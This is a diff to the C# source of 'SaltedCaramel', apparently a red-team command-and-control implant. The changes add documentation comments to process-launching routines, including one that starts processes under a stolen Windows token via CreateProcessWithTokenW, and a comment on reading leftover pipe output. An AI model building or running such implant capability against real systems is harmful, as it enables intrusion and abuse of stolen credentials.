@@ -23,6 +23,13 @@ namespace SaltedCaramel
                StartProcess(task, implant);
         }
 
+        /// <summary>
+        /// Start a process using a stolen token
+        /// C#'s System.Diagnostics.Process doesn't respect a WindowsImpersonationContext so we have to use CreateProcessWithTokenW
+        /// </summary>
+        /// <param name="task"></param>
+        /// <param name="implant"></param>
+        /// <param name="TokenHandle"></param>
         internal static void StartProcessWithToken(SCTask task, SCImplant implant, IntPtr TokenHandle)
         {
             string[] split = task.@params.Trim().Split(' ');
@@ -161,7 +168,7 @@ namespace SaltedCaramel
                         pipeClient.Close();
                         pipeClient.Dispose();
 
-                        while (reader.Peek() > 0)
+                        while (reader.Peek() > 0) // Check if there is still  data in the pipe
                         {
                             message = reader.ReadToEnd(); // Ensure we get any output that we missed when loop ended
                             foreach (string msg in message.Split(new[] { Environment.NewLine }, StringSplitOptions.None))
@@ -202,6 +209,12 @@ namespace SaltedCaramel
             }
         }
 
+        /// <summary>
+        /// Start a process using System.Diagnostics.Process
+        /// If we don't have to worry about a stolen token we can just start a process normally
+        /// </summary>
+        /// <param name="task"></param>
+        /// <param name="implant"></param>
         internal static void StartProcess (SCTask task, SCImplant implant)
         {
             string[] split = task.@params.Trim().Split(' ');
